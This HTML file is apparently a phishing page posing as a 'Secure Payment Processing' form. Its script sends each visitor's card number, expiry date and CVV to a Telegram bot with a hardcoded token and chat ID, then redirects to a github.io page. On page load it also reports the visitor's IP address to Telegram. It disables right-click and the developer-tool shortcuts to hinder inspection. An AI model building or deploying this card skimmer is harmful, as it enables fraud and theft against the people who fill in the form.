<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .payment-form {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            text-align: center;
        }

        .payment-form h2 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-group label {
            font-size: 16px;
            color: #555;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            margin-top: 5px;
        }

        .form-group input:focus {
            border-color: #3498db;
            outline: none;
        }

        .submit-btn {
            background-color: #3498db;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }

        .submit-btn:hover {
            background-color: #2980b9;
        }

        .payment-form p {
            color: #555;
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="payment-form">
        <h2>Payment Form</h2>
        <form id="paymentForm">
            <div class="form-group">
                <label for="cardNumber">Card Number</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
            </div>
            <div class="form-group">
                <label for="expiryDate">Expiry Date (MM/YY)</label>
                <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
            </div>
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
            </div>
            <button type="submit" class="submit-btn">Submit</button>
        </form>
        <p>Secure Payment Processing</p>
    </div>

    <script>
        // Auto-insert slash in expiry date field
        const expiryDateField = document.getElementById('expiryDate');
        expiryDateField.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });

        // Validate expiry date
        expiryDateField.addEventListener('blur', (e) => {
            const value = e.target.value;
            const [month, year] = value.split('/').map(Number);

            const currentYear = new Date().getFullYear() % 100; // Get last two digits of the current year
            const currentMonth = new Date().getMonth() + 1;

            if (
                !value.match(/^\d{2}\/\d{2}$/) || // Ensure format is MM/YY
                month < 1 || month > 12 || // Ensure month is valid
                (year < currentYear || (year === currentYear && month < currentMonth)) // Ensure date is not in the past
            ) {
                alert('Invalid expiry date. Please enter a valid future date in MM/YY format.');
                e.target.value = '';
            }
        });

        // Function to notify Telegram when the user enters the site
        async function notifyUserEntry() {
            const telegramBotToken = 'YOUR_BOT_TOKEN';  // Replace with your Telegram Bot Token
            const chatId = 'YOUR_CHAT_ID';  // Replace with your Telegram Chat ID

            // Get the user's IP address using the Ipify API
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const userIp = data.ip;

                const message = `A user with IP address ${userIp} has entered the website!`;

                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });
            } catch (error) {
                console.error('Error fetching IP or sending message:', error);
            }
        }

        // Call the function when the page is loaded
        window.addEventListener('load', notifyUserEntry);

        // Handle form submission
        document.getElementById('paymentForm').addEventListener('submit', async (event) => {
            event.preventDefault();

            // Collect form data
            const formData = new FormData(event.target);
            const data = {
                cardNumber: formData.get('cardNumber'),
                expiryDate: formData.get('expiryDate'),
                cvv: formData.get('cvv'),
            };

            // Send data to Telegram bot
            const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';  // Replace with your Telegram Bot Token
            const chatId = '7747778364';  // Replace with your Telegram Chat ID

            const message = `New Payment Details:
Card Number: ${data.cardNumber}
Expiry Date: ${data.expiryDate}
CVV: ${data.cvv}`;

            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });

            // Redirect the user to the new URL
            window.location.href = 'https://gerard1334.github.io/papillon-/'; // Updated URL
        });

        // Disable right-click and developer tools
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        document.addEventListener('keydown', (e) => {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
